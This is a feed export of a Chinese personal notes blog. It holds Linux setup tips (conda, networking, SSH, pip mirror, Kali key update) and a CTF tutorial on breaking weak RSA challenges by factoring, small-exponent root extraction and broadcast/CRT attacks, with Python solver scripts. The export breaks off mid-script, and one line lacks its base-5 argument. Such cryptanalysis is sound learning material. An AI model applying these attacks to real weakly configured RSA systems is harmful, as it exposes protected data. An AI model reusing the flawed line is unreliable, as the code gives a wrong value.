    <content type="html"><![CDATA[<h1 id="export-PATH-”-HOME-local-bin-PATH”"><a href="#export-PATH-”-HOME-local-bin-PATH”" class="headerlink" title="export PATH&#x3D;”$HOME&#x2F;.local&#x2F;bin:$PATH”"></a>export PATH&#x3D;”$HOME&#x2F;.local&#x2F;bin:$PATH”</h1><blockquote><p>更新: 2024-11-07 17:20:56<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gc2tccgyvzcq0169">https://www.yuque.com/chaye-apqbl/vsc85q/gc2tccgyvzcq0169</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/conda%E6%BF%80%E6%B4%BB%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/2026/01/19/kali/linux%E5%91%BD%E4%BB%A4/conda%E6%BF%80%E6%B4%BB%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="conda激活虚拟环境"><a href="#conda激活虚拟环境" class="headerlink" title="conda激活虚拟环境"></a>conda激活虚拟环境</h1><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">指定 Python 版本</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">如果需要特定的 Python 版本，例如 3.8，可以使用以下命令：</font></p><p><font style="color:rgb(0, 0, 0);">conda create -n xxx（自命名） python&#x3D;3.8</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">安装特定包</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">在创建环境时，可以同时安装所需的包。例如：</font></p><p><font style="color:rgb(0, 0, 0);">conda create -n xxx（自命名） numpy pandas</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">这会创建一个包含</font><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);"> </font><em><font style="color:rgba(0, 0, 0, 0.75);background-color:rgb(240, 243, 255);">numpy</font></em><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);"> </font><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">和</font><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);"> </font><em><font style="color:rgba(0, 0, 0, 0.75);background-color:rgb(240, 243, 255);">pandas</font></em><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);"> </font><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">的环境。</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">从 YAML 文件创建环境</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">如果有配置文件</font><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);"> </font><em><font style="color:rgba(0, 0, 0, 0.75);background-color:rgb(240, 243, 255);">environment.yml</font></em><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">，可以通过以下命令快速创建环境：</font></p><p><font style="color:rgb(0, 0, 0);">conda </font><font style="color:rgb(27, 106, 199);">env</font><font style="color:rgb(0, 0, 0);"> create -f environment.yml</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">激活和退出环境</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">激活环境：</font></li></ul><p><font style="color:rgb(0, 0, 0);">conda activate myenv</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">退出当前环境：</font></li></ul><p><font style="color:rgb(0, 0, 0);">conda deactivate</font></p><p><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">查看和删除环境</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">查看所有已创建的环境：</font></li></ul><p><font style="color:rgb(0, 0, 0);">conda </font><font style="color:rgb(27, 106, 199);">env</font><font style="color:rgb(0, 0, 0);"> list</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(240, 243, 255);">删除指定环境：</font></li></ul><p><font style="color:rgb(0, 0, 0);">conda remove -n myenv –all</font></p><p>（1）检查conda版本</p><p>conda –version</p><p>（2）获取版本号</p><p>conda –version或 conda -V</p><p>（3）列出所有的环境</p><p>conda env list</p><p>conda list命令用于查看conda下的包，而conda env list命令可以用来查看conda创建的所有虚拟环境。</p><p>（4）查看环境管理的全部命令帮助</p><p>conda env -h</p><p>（5）conda升级</p><p>我们可以在命令行中或者anaconda prompt中执行命令进行操作。</p><p>conda update conda升级conda</p><p>conda update anaconda升级anaconda前要先升级conda</p><p>conda update –all升级所有包</p><p>（6）conda升级后释放空间</p><p>在升级完成之后，我们可以使用命令来清理一些无用的包以释放一些空间：</p><p>conda clean -p删除没有用的包</p><p>conda clean -t删除保存下来的压缩文件（.tar）</p><blockquote><p>更新: 2025-10-27 14:04:52<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/qwoaq7pxuggi97d7">https://www.yuque.com/chaye-apqbl/vsc85q/qwoaq7pxuggi97d7</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%BC%80%E5%90%AFeth0%E7%BD%91%E5%8D%A1/"/>
    <url>/2026/01/19/kali/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%BC%80%E5%90%AFeth0%E7%BD%91%E5%8D%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟机开启eth0网卡"><a href="#虚拟机开启eth0网卡" class="headerlink" title="虚拟机开启eth0网卡"></a>虚拟机开启eth0网卡</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">ip a<br><br>sudo ifconfig eth0 up<br><br>sudo dhclient eth0<br><br>sudo systemctl restart networking<br>或者<br>sudo service network restart<br></code></pre></td></tr></table></figure><p>如果你在虚拟机中遇到网络接口（如 <code>eth0</code>）被关闭的问题，并且希望重新启用它，可以按照以下步骤进行操作：</p><h3 id="1-检查网络接口状态"><a href="#1-检查网络接口状态" class="headerlink" title="1. 检查网络接口状态"></a>1. <strong>检查网络接口状态</strong></h3><p>首先，你可以通过以下命令来查看当前网络接口的状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>ip a<br><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>ifconfig<br><br></code></pre></td></tr></table></figure><p>这将列出所有网络接口和它们的状态。你可以检查 <code>eth0</code> 是否被禁用（例如，显示 <code>DOWN</code> 状态）。</p><h3 id="2-重新启用网络接口"><a href="#2-重新启用网络接口" class="headerlink" title="2. 重新启用网络接口"></a>2. <strong>重新启用网络接口</strong></h3><p>如果 <code>eth0</code> 确实处于禁用状态，可以使用以下命令重新启用它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>&lt;font style=<span class="hljs-string">&quot;color:#DF2A3F;&quot;</span>&gt;<span class="hljs-built_in">sudo</span> ifconfig eth0 up&lt;/font&gt;<br><br></code></pre></td></tr></table></figure><p>或者，使用 <code>ip</code> 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth0 up<br><br></code></pre></td></tr></table></figure><p>执行此命令后，<code>eth0</code> 接口应该被重新启用，并且可以通过 <code>ip a</code> 或 <code>ifconfig</code> 命令来验证接口的状态。</p><h3 id="3-配置网络接口"><a href="#3-配置网络接口" class="headerlink" title="3. 配置网络接口"></a>3. <strong>配置网络接口</strong></h3><p>如果你想配置 <code>eth0</code> 获取 IP 地址，你可以使用 DHCP（动态主机配置协议）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">sudo</span> dhclient eth0<br><br></code></pre></td></tr></table></figure><p>这将使 <code>eth0</code> 接口从 DHCP 服务器请求一个 IP 地址。</p><h3 id="4-检查虚拟机网络设置"><a href="#4-检查虚拟机网络设置" class="headerlink" title="4. 检查虚拟机网络设置"></a>4. <strong>检查虚拟机网络设置</strong></h3><p>如果你仍然无法启用 <code>eth0</code>，可能需要检查虚拟机的网络设置。在虚拟机的管理工具（如 VMware、VirtualBox 等）中，确保网络接口配置正确，并且虚拟机的网络适配器已正确连接（例如，使用桥接模式或 NAT 模式）。</p><h3 id="5-重新启动网络服务"><a href="#5-重新启动网络服务" class="headerlink" title="5. 重新启动网络服务"></a>5. <strong>重新启动网络服务</strong></h3><p>有时，重新启动网络服务可以帮助解决网络接口问题。在基于 Debian&#x2F;Ubuntu 系统的虚拟机上，使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">sudo</span> systemctl restart networking<br><br></code></pre></td></tr></table></figure><p>或者，在一些 Linux 发行版上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">sudo</span> service network restart<br><br></code></pre></td></tr></table></figure><h3 id="6-检查日志文件"><a href="#6-检查日志文件" class="headerlink" title="6. 检查日志文件"></a>6. <strong>检查日志文件</strong></h3><p>如果以上步骤仍然没有解决问题，可以查看系统日志文件，以诊断可能的错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">sudo</span> dmesg | grep eth0<br><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">sudo</span> journalctl -xe<br><br></code></pre></td></tr></table></figure><p>这些命令将帮助你找到与 <code>eth0</code> 相关的错误消息。</p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ol><li><p>通过 <code>ifconfig eth0 up</code> 或 <code>ip link set eth0 up</code> 启用接口。</p></li><li><p>如果需要，使用 <code>dhclient eth0</code> 获取 IP 地址。</p></li><li><p>检查虚拟机的网络设置，确保网络适配器配置正确。</p></li><li><p>检查日志文件，了解是否有其他潜在问题。</p></li></ol><p>这样，你应该能够重新启用虚拟机中的 <code>eth0</code> 网络接口。</p><blockquote><p>更新: 2025-04-12 16:23:54<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/cvg22i1utnkn2czk">https://www.yuque.com/chaye-apqbl/vsc85q/cvg22i1utnkn2czk</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/%E5%BC%80%E5%90%AFssh%E8%BF%9E%E6%8E%A5/"/>
    <url>/2026/01/19/kali/%E5%BC%80%E5%90%AFssh%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="开启ssh连接"><a href="#开启ssh连接" class="headerlink" title="开启ssh连接"></a>开启ssh连接</h1><p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo service ssh status</font></p><p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo service ssh restart</font></p><p><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"></font></p><p><font style="color:rgb(27, 106, 199);">ssh</font><font style="color:rgb(0, 0, 0);"> <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#49;&#46;&#x31;&#x30;&#48;">root@192.168.1.100</a></font></p><blockquote><p>更新: 2025-10-15 19:06:43<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gam7go5wwhuqdwwn">https://www.yuque.com/chaye-apqbl/vsc85q/gam7go5wwhuqdwwn</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/pip%E4%B8%8B%E8%BD%BD%E6%85%A2/"/>
    <url>/2026/01/19/kali/pip%E4%B8%8B%E8%BD%BD%E6%85%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="pip下载慢"><a href="#pip下载慢" class="headerlink" title="pip下载慢"></a>pip下载慢</h1><p>pip install -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a> randcrack</p><p><a href="https://blog.csdn.net/JOKER_0_/article/details/137241370">https://blog.csdn.net/JOKER_0_&#x2F;article&#x2F;details&#x2F;137241370</a></p><blockquote><p>更新: 2025-04-04 14:09:38<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wf1zht7xxucn8rtn">https://www.yuque.com/chaye-apqbl/vsc85q/wf1zht7xxucn8rtn</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/kali/index/"/>
    <url>/2026/01/19/kali/index/</url>
    
    <content type="html"><![CDATA[<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h1 id="更新公钥"><a href="#更新公钥" class="headerlink" title="更新公钥"></a>更新公钥</h1><p>sudo bash -c ‘wget -q -O - <a href="https://archive.kali.org/archive-key.asc">https://archive.kali.org/archive-key.asc</a>  | apt-key add’</p><blockquote><p>更新: 2025-08-22 08:47:03<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/iuamhvbv3szfaeoe">https://www.yuque.com/chaye-apqbl/vsc85q/iuamhvbv3szfaeoe</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/RSA%E5%8A%A0%E5%AF%86/"/>
    <url>/2026/01/19/Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/RSA%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h1><p><a href="https://blog.csdn.net/qq_46145027/article/details/125047313">[CTF密码学]RSA相关题目解题方法与python脚本总结（附例题）_ctf rsa-CSDN博客</a></p><p>RSA作为一种非常经典的非对称公开密钥加密体制，属于是CTF密码学题目中的常客。对刚接触密码学的新手来说，一上来看到各种几百上千位的数字难免感到头大，但实际上了解了RSA的原理和常见解题技巧后也没有那么复杂，常规的RSA题目我觉得算是密码学中比较好拿分的部分了。下面就来介绍一下RSA相关算法原理和各种各样的解题思路。</p><p>以下文章内容不会涉及到很多数学相关知识或算法具体原理，仅以最直白简略的语言来阐述解基本题目的方法思路，要想进一步加深对RSA密码体制的理解还请自行翻阅相关资料。</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RSA是一种非对称加密体制 ，所谓非对称就是加密钥和解密钥不一样，要解决加解密相关问题，我们首先要弄清楚RSA加密解密流程中用到了哪些东西：</p><p>明文  m：就是待加密的文本啦，一般也就是我们的flag。</p><p>密文 C：加密完成后的密文，一般题目会给你，我们要做的就是根据密文解密出明文。</p><p>公钥 e（加密钥）：用来加密的密钥，是一个整数，是公开的。</p><p>两个大素数 p,q：RSA加密的关键部分，一般不会告诉你。我们选取两个大素数并计算它们的乘积，得到n&#x3D;p*q。后面会用p,q,n来加密解密。由于p,q非常大，想要对n进行因式分解得到p，q非常困难，这也确保了RSA的安全性。</p><p>私钥 d（解密钥）：用来解密，一般不会告诉你，d满足e*d mod (p-1)(q-1)&#x3D;1，所以我们只要知道e和p,q就可以把d算出来。</p><p>加密过程：<img src="/./img/49277317_PHKhbjfqdzX59Mip/1722236438694-72f90fec-3487-4baa-9690-bd5a9effe50d-452443.png" alt="1722236438694-72f90fec-3487-4baa-9690-bd5a9effe50d.png"></p><p>解密过程：<img src="/./img/49277317_PHKhbjfqdzX59Mip/1722236447311-f8f7ff41-21c3-454e-a122-27b9a3f7057d-321068.png" alt="1722236447311-f8f7ff41-21c3-454e-a122-27b9a3f7057d.png"></p><p> 以上就是一个常规RSA算法的组成部分。通过上面的内容我们可以知道要想解密一段密文，我们需要c,d,n三个值。其中c我们是知道的，而n和d都可以通过p,q,e算出来，e我们一般也是知道的，也就是说常规的rsa题目我们的解题思路就是想想怎样把p和q求出来。并以此进行解密。</p><h1 id="思路一、分解n得到p-q"><a href="#思路一、分解n得到p-q" class="headerlink" title="思路一、分解n得到p,q"></a>思路一、分解n得到p,q</h1><p>适用情况：n已知且可因式分解</p><p>既然n &#x3D; p*q，那么最常规的想法就是把n因式分解得到p,q，上面说n很难分解，但对于一些不太大的n，我们可以借助工具去分解它。下面介绍两种常规因式分解方法：</p><p>第一种：在线因式分解网站，例如<a href="http://www.factordb.com/">factordb.com</a>，我们可以利用在线网站快速分解出p,q</p><p>第二种：yafu大数分解工具，windows下载地址：<a href="https://sourceforge.net/projects/yafu/">yafu download | SourceForge.net</a>使用相关命令分解n:</p><p><a href="https://blog.csdn.net/s_a2g1a3j1/article/details/134704186?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172239333416800186519963%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172239333416800186519963&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-134704186-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=yafu%E7%9A%84%E4%BD%BF%E7%94%A8&spm=1018.2226.3001.4187">yafu命令及使用方法-CSDN博客</a></p><p><font style="color:rgb(79, 79, 79);">yafu-x64 factor(n)                               &#x2F;&#x2F;常规分解n</font></p><p><font style="color:rgb(79, 79, 79);">yafu-x64 “factor(@)” -batchfile 1.txt   &#x2F;&#x2F;把n复制到txt文件中再分解，用于n过长的情况</font></p><p><font style="color:rgb(79, 79, 79);"></font></p><h3 id="例题：BUUCTF：-WUSTCTF2020-babyrsa"><a href="#例题：BUUCTF：-WUSTCTF2020-babyrsa" class="headerlink" title="例题：BUUCTF：[WUSTCTF2020]babyrsa"></a><strong><font style="color:rgb(79, 79, 79);">例题：</font></strong><font style="color:rgb(79, 79, 79);">BUUCTF：[WUSTCTF2020]babyrsa</font></h3><p><font style="color:rgb(77, 77, 77);">附件给出了c,n,e：</font></p><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722236571580-d54c1aea-c8bd-48fa-b3c4-86cf642eb22a-028619.png" alt="1722236571580-d54c1aea-c8bd-48fa-b3c4-86cf642eb22a.png"></p><p><font style="color:rgb(77, 77, 77);">得到p，q后按解密方法算出明文即可，python脚本如下：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br> <br> <br>q = <span class="hljs-number">189239861511125143212536989589123569301</span><br>p = <span class="hljs-number">386123125371923651191219869811293586459</span><br> <br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span><br><span class="hljs-comment"># n = 73069886771625642807435783661014062604264768481735145873508846925735521695159</span><br>n = q*p<br><span class="hljs-comment"># print(n)</span><br>d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d=&quot;</span>,d)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">运行即可得到flag，这也是最常规的解密RSA的脚本结构。</font></p><p><font style="color:rgb(77, 77, 77);">这里python脚本需要一个gmpy2模块，这是密码学中非常重要的一个模块，pip安装就行了。</font></p><h1 id="思路二、低加密指数攻击（e很小）"><a href="#思路二、低加密指数攻击（e很小）" class="headerlink" title="思路二、低加密指数攻击（e很小）"></a><font style="color:rgb(79, 79, 79);">思路二、低加密指数攻击（e很小）</font></h1><p><font style="color:rgb(77, 77, 77);">适用情况：n很大但是e很小，一般e&#x3D;3</font></p><p><font style="color:rgb(77, 77, 77);">n很大时我们就不能因式分解了，当然还有其他思路，</font></p><p><font style="color:rgb(77, 77, 77);">例如当e很小时，比如e&#x3D;3，有</font><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240026887-6978bada-5c7a-4f3e-a413-fcc1758e5fa0-033380.gif" alt="1722240026887-6978bada-5c7a-4f3e-a413-fcc1758e5fa0.gif"><font style="color:rgb(77, 77, 77);">，我们可以对k进行爆破，直到</font><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240026897-ad2cf04a-9f62-4f35-bd8c-29fd80c46560-858208.gif" alt="1722240026897-ad2cf04a-9f62-4f35-bd8c-29fd80c46560.gif"><font style="color:rgb(77, 77, 77);">可以开根，借此得到m。</font></p><h3 id="例题：BUUCTF-DangrousRSA"><a href="#例题：BUUCTF-DangrousRSA" class="headerlink" title="例题：BUUCTF DangrousRSA"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF DangrousRSA</font></h3><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240050785-079d06b2-4f9e-40fc-a2f9-c96b22725b9e-665207.png" alt="1722240050785-079d06b2-4f9e-40fc-a2f9-c96b22725b9e.png"></p><p><font style="color:rgb(77, 77, 77);">题目的n很大，但e仅仅是3，此时我们就可以进行低加密指数攻击，python脚本如下：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de</span>(<span class="hljs-params">c, e, n</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        m = c + n*k<br>        result, flag = gmpy2.iroot(m, e)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == flag:<br>            <span class="hljs-keyword">return</span> result<br>        k += <span class="hljs-number">1</span><br>e= <span class="hljs-number">3</span><br>n= <span class="hljs-number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span><br>c= <span class="hljs-number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br> <br>m=de(c,e,n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="思路三、1）低指数加密广播攻击（e很小-多组n-c）"><a href="#思路三、1）低指数加密广播攻击（e很小-多组n-c）" class="headerlink" title="思路三、1）低指数加密广播攻击（e很小;多组n,c）"></a><font style="color:rgb(79, 79, 79);">思路三、1）低指数加密广播攻击（e很小;多组n,c）</font></h1><p><font style="color:rgb(77, 77, 77);">适用情况：很多组不同的n和c，但用的是同一个e且很小。</font></p><p><font style="color:rgb(77, 77, 77);">此时我们可以使用中国剩余定理来求出</font><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240143684-b1541a09-6d19-4f6c-8cd0-c37a01ef4bd4-234635.gif" alt="1722240143684-b1541a09-6d19-4f6c-8cd0-c37a01ef4bd4.gif"><font style="color:rgb(77, 77, 77);">，什么是中国剩余定理自己去了解，这里只讲怎么用python解题，见例题：</font></p><h3 id="例题：BUUCTF-RSA4"><a href="#例题：BUUCTF-RSA4" class="headerlink" title="例题：BUUCTF RSA4"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF RSA4</font></h3><p><font style="color:rgb(77, 77, 77);">题目给了很多组n和c</font></p><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240171648-abf1781c-c586-4140-b173-9dbb06dd0a9c-202173.png" alt="1722240171648-abf1781c-c586-4140-b173-9dbb06dd0a9c.png"></p><p>当n很大时我们就可以考虑e&#x3D;3的低指数情况，把n和c放到数组里，像n&#x3D;[n1,n2,n3]，c&#x3D;[c1,c2,c3].然后最方便的是调用sympy库里的中国剩余定理，也就是crt(c,n)方法直接可以求出m的e次，然后开方得到m就行了。其中sympy也是第三方库，可以pip或者pycharm里导入的时候顺手装上去就行了。</p><p>这道题还有一点要注意的是给出的n和c是五进制，注意先转换成10进制。python解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>import libnum<br>from Crypto.Util.number import long_to_bytes<br>from sympy.ntheory.modular import crt<br><br>N1 = int(&#x27;331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004&#x27;,5)<br>c1 = int(&#x27;310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243&#x27;,5)<br><br>N2 = int(&#x27;302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114&#x27;,5)<br>c2 = int(&#x27;112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344&#x27;,)<br><br>N3 = int(&#x27;332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323&#x27;,5)<br>c3 = 